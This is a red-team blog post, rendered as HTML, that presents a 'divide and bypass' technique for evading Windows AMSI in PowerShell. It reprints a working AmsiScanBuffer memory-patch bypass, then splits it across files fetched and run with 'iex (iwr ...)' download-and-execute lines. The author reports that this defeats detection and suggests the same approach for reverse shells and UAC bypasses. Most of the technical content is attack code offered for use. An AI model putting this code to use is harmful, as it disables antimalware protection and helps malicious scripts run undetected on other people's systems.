<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="UnJN0X8aSA7Vas0N6FhAFn-PjFV-OU0wZh9gGAnWM0o"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Divide And Bypass: A new Simple Way to Bypass AMSI" /><meta name="author" content="Brahim Chebli" /><meta property="og:locale" content="en" /><meta name="description" content="This post is about a new simple way to bypass AMSI (Antimalware Scan Interface), that can be applied on small scripts, specially the popular AMSI bypasses." /><meta property="og:description" content="This post is about a new simple way to bypass AMSI (Antimalware Scan Interface), that can be applied on small scripts, specially the popular AMSI bypasses." /><link rel="canonical" href="https://x4sh3s.github.io/posts/Divide-and-bypass-amsi/" /><meta property="og:url" content="https://x4sh3s.github.io/posts/Divide-and-bypass-amsi/" /><meta property="og:site_name" content="x4sh3s" /><meta property="og:image" content="https://x4sh3s.github.io/assets/img/commons/divide.jpg" /><meta property="og:image:height" content="500" /><meta property="og:image:width" content="800" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-09T17:32:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x4sh3s.github.io/assets/img/commons/divide.jpg" /><meta property="twitter:title" content="Divide And Bypass: A new Simple Way to Bypass AMSI" /><meta name="twitter:site" content="@x4sh3s" /><meta name="twitter:creator" content="@x4sh3s" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Brahim Chebli","url":"https://github.com/x4sh3s/"},"dateModified":"2022-12-10T14:20:24+01:00","datePublished":"2022-12-09T17:32:00+01:00","description":"This post is about a new simple way to bypass AMSI (Antimalware Scan Interface), that can be applied on small scripts, specially the popular AMSI bypasses.","headline":"Divide And Bypass: A new Simple Way to Bypass AMSI","image":{"width":800,"height":500,"alt":null,"url":"https://x4sh3s.github.io/commons/divide.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://x4sh3s.github.io/posts/Divide-and-bypass-amsi/"},"url":"https://x4sh3s.github.io/posts/Divide-and-bypass-amsi/"}</script><title>Divide And Bypass: A new Simple Way to Bypass AMSI | x4sh3s</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="x4sh3s"><meta name="application-name" content="x4sh3s"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">x4sh3s</a></div><div class="site-subtitle font-italic">Cyber Security Researcher, Red Team Developer ...</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/x4sh3s" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/x4sh3s" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/brahim-chebli" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Divide And Bypass: A new Simple Way to Bypass AMSI</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Divide And Bypass: A new Simple Way to Bypass AMSI</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1670603520" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 9, 2022 </em> </span> <span> Updated <em class="" data-ts="1670678424" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 10, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 500'%3E%3C/svg%3E" data-src="/assets/img/commons/divide.jpg" class="preview-img bg" alt="Preview Image" width="800" height="500" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/x4sh3s/">Brahim Chebli</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1139 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p>This post is about a new simple way to bypass AMSI (Antimalware Scan Interface), that can be applied on small scripts, specially the popular AMSI bypasses.</p><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In the last few years, Powershell become so popular and a great target for hackers, as it provide access to almost all windows’s components, due to its integration with .NET framework, which allows us, Offensive security guys to perform differents attacks without even touching the disk, and that make AV jobs more difficut! Because of that, Microsoft introduced AMSI in 2015 as a defence Layer against this type of attacks, you can read all about it <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">here</a>.</p><p>A defense mechanism for the offensive side, means that it need a bypass, and that’s what happened, new bypasses are discovered, Matt Graeber’s Reflection method, Patching amsi.dll AmsiScanBuffer by rasta-mouse etc …</p><h2 id="problem"><span class="mr-2">Problem?</span><a href="#problem" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With all those differents AMSI bypasses, using .NET related offensive tools become possible again. Until those AMSI bypasses got signatures and become detected, and that open a new static analysis bypass/obfuscation adventures, Which sometimes become so boring and time consuming with a high possibility to not get a good result.</p><p>Personally, i use powershell a lot, and i got tired of obfuscating small scripts, so it was very important for me to find a new way to bypass AMSI in powershell ..</p><h2 id="thought-process"><span class="mr-2">Thought Process</span><a href="#thought-process" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I’m sure if you have ever played with AMSI bypass before, you have noticed that copying pasting a script into a powershell session will bypass AMSI, even if the script itself is detected. And that’s because by copying and pasting a script, it’s executed as separated lines, and it’s very unusual to create a signature for an individual line, because that will cause alot of false positives. So how to get advantage of this ..? how can this be used in a real scenario? Maybe dividing the script into small files? let’s try this ..</p><h3 id="simple-test"><span class="mr-2">Simple Test</span><a href="#simple-test" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>i started with a small simple scripts :</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># simple_test.ps1</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s1">'x4sh3s'</span><span class="w">
</span><span class="nv">$var</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Process</span><span class="w">
</span><span class="nx">cat</span><span class="w"> </span><span class="nv">$var</span><span class="w">
</span></pre></table></code></div></div><p>Let’s divided it into 3 files, and execute the main one, to see if there are any problems with scoping or something else..</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># 1.txt</span><span class="w">
</span><span class="nv">$var</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Process</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># 2.txt</span><span class="w">
</span><span class="n">cat</span><span class="w"> </span><span class="nv">$var</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># main.ps1</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s1">'x4sh3s'</span><span class="p">;</span><span class="w">
</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://</span><span class="nv">$MyIP</span><span class="nx">/1.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="p">);</span><span class="w">
</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://</span><span class="nv">$MyIP</span><span class="nx">/2.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="p">);</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>the 2 files here <code class="language-plaintext highlighter-rouge">1.txt and 2.txt</code> can be hosted online, or in your local machine by simply starting a simple python web server <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code>.</p></div></blockquote><p>By executing <code class="language-plaintext highlighter-rouge">./main.ps1</code> We see the processes list, which means that the variable <code class="language-plaintext highlighter-rouge">$var</code> in <code class="language-plaintext highlighter-rouge">1.txt</code> is accessible by <code class="language-plaintext highlighter-rouge">2.txt</code>. Good, let’s try something else, maybe <code class="language-plaintext highlighter-rouge">Add-Type</code>.</p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">Add-Type</code> cmdlet adds a Microsoft .NET class to a PowerShell session. It’s used by Some AMSI Bypass which we’ll see later ..</p></div></blockquote><p>I took this example from <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2"><em>Microsoft</em></a>:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c"># script.ps1</span><span class="w">

</span><span class="n">echo</span><span class="w"> </span><span class="s2">"This Line Is Mine"</span><span class="w">

</span><span class="nv">$Source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
public class BasicTest
{
  public static int Add(int a, int b)
    {
        return (a + b);
    }
  public int Multiply(int a, int b)
    {
    return (a * b);
    }
}
"@</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="nv">$Source</span><span class="w">
</span><span class="p">[</span><span class="n">BasicTest</span><span class="p">]::</span><span class="n">Add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w">
</span><span class="nv">$BasicTestObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">BasicTest</span><span class="w">
</span><span class="nv">$BasicTestObject</span><span class="o">.</span><span class="nf">Multiply</span><span class="p">(</span><span class="nx">5</span><span class="p">,</span><span class="w"> </span><span class="nx">2</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Let’s apply the same previous steps on it.. we will divide it into 3 files ..</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c"># 1.txt</span><span class="w">
</span><span class="nv">$Source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
public class BasicTest
{
  public static int Add(int a, int b)
    {
        return (a + b);
    }
  public int Multiply(int a, int b)
    {
    return (a * b);
    }
}
"@</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># 2.txt</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="nv">$Source</span><span class="w">
</span><span class="p">[</span><span class="n">BasicTest</span><span class="p">]::</span><span class="n">Add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w">
</span><span class="nv">$BasicTestObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">BasicTest</span><span class="w">
</span><span class="nv">$BasicTestObject</span><span class="o">.</span><span class="nf">Multiply</span><span class="p">(</span><span class="nx">5</span><span class="p">,</span><span class="w"> </span><span class="nx">2</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># main.ps1</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"This Line Is Mine"</span><span class="w">
</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://</span><span class="nv">$MyIP</span><span class="nx">/1.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="p">);</span><span class="w">
</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://</span><span class="nv">$MyIP</span><span class="nx">/2.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="p">);</span><span class="w">
</span></pre></table></code></div></div><p>And it worked again, without problems:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\x4sh3s\OneDrive\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\main.ps1</span><span class="w">
</span><span class="n">This</span><span class="w"> </span><span class="nx">Line</span><span class="w"> </span><span class="nx">Is</span><span class="w"> </span><span class="nx">Mine</span><span class="w">
</span><span class="mi">7</span><span class="w">
</span><span class="mi">10</span><span class="w">
</span></pre></table></code></div></div><h2 id="bypass-amsi"><span class="mr-2">Bypass AMSI</span><a href="#bypass-amsi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now, after we confirmed that this method work on the previous scripts, let’s apply it on scripts that are detected, and see if we can execute them without making AMSI angry!</p><p>I’ll take The following script by Rastamouse as an example:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c"># amsi_bypass.ps1</span><span class="w">
</span><span class="nv">$Win32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nv">$Win32</span><span class="w">

</span><span class="nv">$LoadLibrary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"am"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"si.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$Address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$LoadLibrary</span><span class="p">,</span><span class="w"> </span><span class="s2">"Amsi"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"Scan"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"Buffer"</span><span class="p">)</span><span class="w">
</span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$Address</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x40</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$p</span><span class="p">)</span><span class="w">
</span><span class="nv">$Patch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">xB8</span><span class="p">,</span><span class="w"> </span><span class="nx">0x57</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00</span><span class="p">,</span><span class="w"> </span><span class="nx">0x07</span><span class="p">,</span><span class="w"> </span><span class="nx">0x80</span><span class="p">,</span><span class="w"> </span><span class="nx">0xC3</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$Patch</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$Address</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>If we try execute it, we’ll get this output : <img data-src="/assets/img/commons/Rastamouse_amsi.png" alt="Amsi Bypass" data-proofer-ignore></p><p>The Bypass itself is detected!</p><p>Let’s divide it into 3 files</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># 1.txt</span><span class="w">
</span><span class="nv">$LoadLibrary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"am"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"si.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$Address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$LoadLibrary</span><span class="p">,</span><span class="w"> </span><span class="s2">"Amsi"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"Scan"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"Buffer"</span><span class="p">)</span><span class="w">
</span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="nv">$Patch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">xB8</span><span class="p">,</span><span class="w"> </span><span class="nx">0x57</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00</span><span class="p">,</span><span class="w"> </span><span class="nx">0x07</span><span class="p">,</span><span class="w"> </span><span class="nx">0x80</span><span class="p">,</span><span class="w"> </span><span class="nx">0xC3</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c"># 2.txt</span><span class="w">
</span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$Address</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x40</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$p</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$Patch</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$Address</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="c"># main.ps1</span><span class="w">
</span><span class="nv">$Win32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nv">$Win32</span><span class="w">

</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://localhost/1.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="p">);</span><span class="w">
</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://localhost/2.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="p">);</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="/assets/img/commons/divide_amsi_bypass.png" alt="Amsi Bypass_Divide" data-proofer-ignore></p><p>It Successfully Bypass AMSI, without changing a letter in the code! Niice..</p><p><img data-src="/assets/img/commons/Saul_Godman.jif" alt="It's All Good, Man" data-proofer-ignore></p><blockquote class="prompt-warning"><div><p>In case it’s detected, breaking the script into more files (Line/file) will do the job, unless Microsoft finds a way to deny this method. Until then, Enjoy ^^</p></div></blockquote><p>You can found a PoC of all of that <a href="https://github.com/x4sh3s/AMSI_Lines">here</a></p><h2 id="conclusion"><span class="mr-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We reached the end of the post,</p><p>As a review, we saw how to bypass AMSI by dividing a script into small files. I think the most useful use-case of this method is execute an AMSI bypass, but it can be applied on any scripts ( small scripts ), Reverse shell, FODHelper UAC Bypass .. I didn’t testing on a script that contains defined functions, but the principle stay the same.</p><p>i hope you learned something new by reading this post, if you have any comment/idea let me know, Any feedback will be appreciated ..</p><h2 id="links--resources"><span class="mr-2">Links &amp; Resources</span><a href="#links--resources" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><p><strong><em>Hacker Cat Image</em></strong> <a href="https://images.wallpaperscraft.com/image/single/cat_silhouette_hacker_215616_1440x900.jpg">https://images.wallpaperscraft.com/image/single/cat_silhouette_hacker_215616_1440x900.jpg</a></p><li><p><strong><em>Add-Type</em></strong> <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2</a></p><li><p><strong><em>RastaMouse Amsi Bypass</em></strong> <a href="https://rastamouse.me/memory-patching-amsi-bypass/">https://rastamouse.me/memory-patching-amsi-bypass/</a></p><li><p><strong><em>AMSI</em></strong> <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</a></p></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/defense-evasion/'>Defense Evasion</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/amsi/" class="post-tag no-text-decoration" >amsi</a> <a href="/tags/powershell/" 